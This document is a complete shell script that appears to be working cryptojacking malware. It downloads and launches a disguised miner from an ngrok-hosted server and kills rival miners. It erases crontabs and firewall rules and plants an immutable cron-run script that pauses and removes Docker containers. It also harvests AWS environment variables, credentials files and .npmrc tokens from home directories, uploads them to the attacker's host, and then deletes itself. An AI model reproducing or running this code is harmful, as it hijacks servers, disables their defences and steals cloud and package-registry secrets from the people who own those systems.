export HOST="http://a8647c0f.ngrok.io"
export RIP="404869bddc69513ac6bdcea0c0a348db"

reportinfo() {
  local _usr="$(whoami 2>/dev/null)"
  local _url="$HOST/m?o=$(pido)&r=${RIP}&t=${PROCS}&l=d&u=${_usr}"

  if type "wget" >/dev/null 2>&1 ; then
    wget -q "${_url}" >/dev/null 2>&1
  elif type "curl" >/dev/null 2>&1 ; then
    curl -sk "${_url}" >/dev/null 2>&1
  elif type "perl" >/dev/null 2>&1 ; then
    perl -e "use File::Fetch;my \$url = '${_url}'; my \$ff = File::Fetch->new(uri => \$url); my \$file = \$ff->fetch() or die ''; unlink(\$file)" >/dev/null 2>&1
  fi
}

finish () {
  excode=$?
  if [ $excode -eq 16 ]; then
    exit 0
  fi
  pcid=$(pido)
  if [ x"${pcid}" != x"" ]; then
    reportinfo
    if [ -s 790ff1583908 ]; then
      curl -sk -X POST -F file=@790ff1583908 -F r="$RIP" "$HOST/contact?k=1"
    fi
  else
    if type "curl" >/dev/null 2>&1 ; then
      curl -s -F file=@790ff1583908 "$HOST/contact?r=${RIP}&e=1" > /dev/null 2>&1
    elif type "wget" >/dev/null 2>&1 ; then
      tsh=$(wget --method PUT --body-file=790ff1583908 -O - -nv 2>/dev/null)
      wget --method POST "$HOST/contact?r=${RIP}&e=1&file=${tsh}" > /dev/null 2>&1
    fi
  fi
  rm -f 790ff1583908
  exit $excode
}
trap finish EXIT

pido(){
  PIX=$(ps uxww|grep "404869bddc69513ac6bdcea0c0a348dbi"|grep -v grep|grep -v defunct|grep -v serve|grep -v tmpfile|awk '{print $2, $1}'|head -n 1)
  PI=$(echo $PIX | awk '{print $1}')
  if [ x"${PI}" = x"$(whoami 2>/dev/null)" ]; then
    echo "${PIX}" | awk '{print $2}'
  else
    echo "${PI}"
  fi
}
killall() {
  ps uxww|grep "$RIP"|grep -v grep|grep -v tmpfile|grep -v defunct|grep -v serve|awk '{print $2}'|xargs -r kill -TTOU
  ps uxww|grep "$RIP"|grep -v grep|grep -v tmpfile|grep -v defunct|grep -v serve|awk '{print $2}'|xargs -r kill -9
}
killother() {
  ps uxww|grep "$RIP"|grep -v grep|grep -v tmpfile|grep -v defunct|grep -v serve|awk '{print $2}'|sed '$d'|xargs -r kill -TTOU
  ps uxww|grep "$RIP"|grep -v grep|grep -v tmpfile|grep -v defunct|grep -v serve|awk '{print $2}'|sed '$d'|xargs -r kill -9
}

INSTALL="/var/tmp/.404869bddc69513ac6bdcea0c0a348db/"
mkdir -p $INSTALL

if [ ! -d "$INSTALL" ]; then
  INSTALL="/tmp/.404869bddc69513ac6bdcea0c0a348db/"
  mkdir -p $INSTALL
fi

if [ ! -d "$INSTALL" ]; then
  INSTALL="$(pwd)/"
fi

chmod 770 $INSTALL
cd $INSTALL

export LD_LIBRARY_PATH="$INSTALL:$LD_LIBRARY_PATH"
export PATH="$INSTALL:$PATH"


PROCS=$(expr $(grep -E "^processor" /proc/cpuinfo | wc -l) - 0)
if [ $PROCS -eq 0 ]; then
  PROCS=1
fi

pid=$(ps uxww|grep -v grep|grep -- '45hsTaSqTQM4K1Xeqkcy7eLzqdEuQ594fJVmQryCemQSCU878JGQdSDCxbhNyVjSkiaYat8yAfBuRTPSEUPZoARm9a5XEHZ'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- '42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- '47sghzufGhJJDQEbScMCwVBimTuq6L5JiRixD8VeGbpjCTA12noXmi4ZyBZLc99e66NtnKff34fHsGRoyZk3ES1s1V4QVcB'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- '44iuYecTjbVZ1QNwjWfJSZFCKMdceTEP5BBNp4qP35c53Uohu1G7tDmShX1TSmgeJr2e9mCw2q1oHHTC2boHfjkJMzdxumM'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- '49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- '4AniF816tMCNedhQ4J3ccJayyL5ZvgnqQ4X9bK7qv4ZG3QmUfB9tkHk7HyEhh5HW6hCMSw5vtMkj6jSYcuhQTAR1Sbo15gB'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'Circle_MI'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'cryptonight'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'xmr.crypto-pool.fr'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'Circle_CF'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- '429MTSFoLS8E82yAepehvf1aG1Pt3Usz2DtSa28xekoKeVk1Yk8LKn24AQdtVNxBu73yS9VMxSxAaU1rkM4uZPczF9ozWXR'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'nm9LI'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- '/tmp/.httpd'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- '-c httpd.conf'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- '44WR4cmniSEXKknaKR5khKbA9dmdsL6oA1e7Jvkf8KEvYLvfSyWe6tF6PuLN81iAfTLBQovE9AT2icAezyxuH72iAQC8nQb'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'minexmr.com'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'Circle_AA'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'minergate'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'php refresh'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'tmp/.cron'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- '.resyslogd'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'xmr-stak'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi
pid=$(ps uxww|grep -v grep|grep -- 'sync_supers'|awk '{print $2}'); if [ x"${pid}" != x"" ]; then kill -9 $pid >/dev/null 2>&1; fi

reu() {
chattr -i $1 >/dev/null 2>&1
rm -rf $1 >/dev/null 2>&1
mkdir -p $1 > $1 2>/dev/null
}

if [ x"$(whoami 2>/dev/null)" = x"root" ]; then
reu /tmp/Circle_CF.png
reu /tmp/kcore
reu /tmp/BoomBoom
reu /usr/bin/ntpd
fi

app_md5_list=""
ps uxww|sort -k3n|grep -v grep|grep -v COMMAND|tail -n 10|awk '{print $2,$11,$3,$6}' |
while IFS= read -r p_name; do
  p_pid=$(echo ${p_name}|awk '{print $1}')
  p_n=$(echo ${p_name}|awk '{print $2}')
  p_l=$(echo ${p_name}|awk '{print $3}')
  p_m=$(echo ${p_name}|awk '{print $4}')
  p_fp=$(ls -l /proc/${p_pid}/exe 2>/dev/null|awk '{print $NF}')

  if [ x"${p_n}" = x"404869bddc69513ac6bdcea0c0a348dbi" ]; then continue; fi
  if [ x"${p_m}" = x"0" ]; then continue; fi
  if [ x"${p_fp}" != x"" ]; then
    if [ x"${p_fp}" = x"(deleted)"  ]; then
      kill -9 ${p_pid} > /dev/null 2>&1
    else
      p_l=${p_l%.*}
      p_md5=$(md5sum ${p_fp} 2>/dev/null|awk '{print $1}')
      [ $p_l -gt 20 ] && [ x"${p_md5}" != x"c0fd9f4a57ba4eb36208504e050c906d" ] && echo "---appstore--- $p_name $p_md5 $p_fp" >> 790ff1583908
      for md5 in ${app_md5_list}; do
        if [ x"${p_md5}" = x"${md5}" ]; then
          kill -9 ${p_pid} >/dev/null 2>&1
          chattr -i ${p_fp} >/dev/null 2>&1
          chmod -x ${p_fp} >/dev/null 2>&1
          echo '#!/bin/sh' > $p_fp 2>/dev/null
          chattr +i ${p_fp} >/dev/null 2>&1
        fi
      done
    fi
  fi
done

download() {
  chattr -i "${INSTALL}$2" >/dev/null 2>&1
  find "${INSTALL}$2" -exec chmod 770 {} + >/dev/null 2>&1
  chmod -R 770 "${INSTALL}$2">/dev/null 2>&1
  rm -rf "${INSTALL}$2">/dev/null 2>&1
  if type "curl" >/dev/null 2>&1 ; then
    curl -fks -o $2 $1
    return $?
  elif type "wget" >/dev/null 2>&1 ; then
    wget --timeout=60 -q $1 -O $2
    return $?
  elif type "perl" >/dev/null 2>&1 ; then
    perl -e "use File::Fetch;my \$url = '${1}'; my \$ff = File::Fetch->new(uri => \$url); my \$file = \$ff->fetch() or die "\$!"; system(\"mv \$file ${2}\")"
    return $?
  fi

  return 1
}

start() {
  chmod +x 404869bddc69513ac6bdcea0c0a348dbi
  cat $INSTALL/3eecb5e97a | 404869bddc69513ac6bdcea0c0a348dbi >/dev/null 2>&1 &
  sleep 1
  rm -rf 3eecb5e97a
}

install() {
  killother
  pcid=$(pido)
  if [ x"${pcid}" != x"" ]; then
    return 0
  fi

  killall
  download "$HOST/d8/daemon" "404869bddc69513ac6bdcea0c0a348dbi"
  download "$HOST/d8/nginx" "3eecb5e97a"
  start
}

install

cat /etc/hosts | grep nanopool >/dev/null
if [ $? -eq 0 ]; then
  echo "127.0.0.1 localhost" > /etc/hosts
fi

if [ x"$(whoami 2>/dev/null)" != x"root" ]; then
  crontab -r >/dev/null 2>&1
else
  echo "" >790ff1583908_cron

  crontab -l >/dev/null 2>&1
  if [ $? -eq 0 ]; then
    crontab -l | while IFS= read -r cron; do
      dl=$(echo "${cron}" | grep -E "(curl |wget |${RIP})")
      if [ x"${dl}" = x"" ]; then
        [ x"${cron}" != x"" ] && echo "${cron}" >>790ff1583908_cron
      else
        echo "pomijam wpis $cron" >>790ff1583908 2>&1
      fi
    done

    cat 790ff1583908_cron | crontab - >>790ff1583908 2>&1
    if [ $? -ne 0 ]; then
      crontab -r >/dev/null 2>&1
    fi
  fi
  rm -f 790ff1583908_cron
fi

iptables -P INPUT ACCEPT >/dev/null 2>&1
iptables -P FORWARD ACCEPT >/dev/null 2>&1
iptables -P OUTPUT ACCEPT >/dev/null 2>&1
iptables -t nat -F >/dev/null 2>&1
iptables -t mangle -F >/dev/null 2>&1
iptables -F >/dev/null 2>&1
iptables -X >/dev/null 2>&1

if type "curl" >/dev/null 2>&1 ; then
CFG="/tmp/.ce4ca8"
env | grep AWS>>$CFG;
find /home -maxdepth 5 -type f -name 'credentials' 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %'>>$CFG 2>/dev/null
find /home -maxdepth 5 -type f -name '.npmrc' 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %'>>$CFG 2>/dev/null
if [ -s $CFG ]; then
  curl -s -F file=@$CFG "$HOST/c?r=${RIP}" >/dev/null 2>&1
fi
rm -rf $CFG
fi


chattr -i /usr/sbin/scoutd
rm -rf /usr/sbin/scoutd
echo '#!/bin/sh' > /usr/sbin/scoutd
echo "docker ps --no-trunc | grep -E '(echo helloworld|dockerminer|xmr-stak|[sS]tratum|xmrig|xmrdemo|oceanhole|minergate|\s+-u etn|\s+-u Sumo)' | awk '{print \$1}' | xargs -r docker pause >/dev/null 2>&1" >> /usr/sbin/scoutd
echo "ps ux | awk '/minergate|nodjs|xmrig|crond|init/ {print \$2}' | xargs -n1 -I {} cat /proc/{}/cgroup 2>/dev/null| awk -F / '/cpu/ {print \$NF}' | sort -u | xargs -r docker pause" >> /usr/sbin/scoutd
echo "docker ps --no-trunc | grep -E '(days.+Paused)' | awk '{print \$1}' | xargs -r docker rm --force >/dev/null 2>&1" >> /usr/sbin/scoutd
chmod +x /usr/sbin/scoutd
chattr +i /usr/sbin/scoutd
echo '' > /etc/crontab
echo '* * * * * root /usr/sbin/scoutd >/dev/null' > /etc/cron.d/1m
rm -rf /var/spool/cron/root 2>/dev/null; service crond restart >/dev/null 2>&1; mkdir -p /var/spool/cron/root >/dev/null 2>&1
pkill -f '.koo'
ps ux | grep '.koo' | grep -v grep | awk '{print $2}' | xargs -r kill -9
ps ux | grep '.scsid' | grep -v grep | awk '{print $2}' | xargs -r kill -9
pkill -9 -f curl
pkill -9 -f wget
pkill -9 -f pythno

rm "$0"

exit 0
